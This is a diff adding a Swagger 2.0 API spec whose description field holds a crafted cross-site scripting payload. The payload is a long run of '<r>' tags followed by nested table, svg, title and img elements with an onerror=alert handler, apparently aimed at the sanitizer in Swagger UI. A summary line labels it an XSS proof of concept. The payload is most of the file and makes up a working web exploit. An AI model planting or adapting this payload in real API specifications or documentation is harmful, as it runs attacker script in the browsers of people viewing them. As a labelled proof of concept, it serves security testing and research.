@@ -1,0 +1,14 @@
+swagger: '2.0'
+info:
+  title:  InfoSec 2025
+  description: '<r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><table><caption><svg><desc><table><caption></table></desc><title><a title="</title><img src onerror=alert(2025)>">'
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: 2b643c9f2234c12d3d6bd0c4056a13d7
+      summary: DO NOT REMOVE needed for swagger xss poc 2b643c9f2234c12d3d6bd0c4056a13d7 DO NOT REMOVE
